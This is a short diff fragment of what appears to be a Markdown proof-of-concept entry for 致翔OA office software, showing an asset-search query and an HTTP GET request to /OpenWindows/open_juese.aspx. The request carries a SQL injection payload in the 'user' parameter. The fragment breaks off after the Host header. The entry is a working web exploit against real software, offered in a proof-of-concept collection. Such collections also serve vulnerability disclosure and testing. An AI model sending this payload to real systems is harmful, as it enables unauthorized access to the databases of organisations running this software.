@@ -8,7 +8,7 @@ app="致翔软件-致翔OA"
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1727332106847-17eef327-0131-44fc-8f66-5e218638666a.png)
 
-## poc
+## POC
 ```java
 GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr= HTTP/1.1
 Host: 
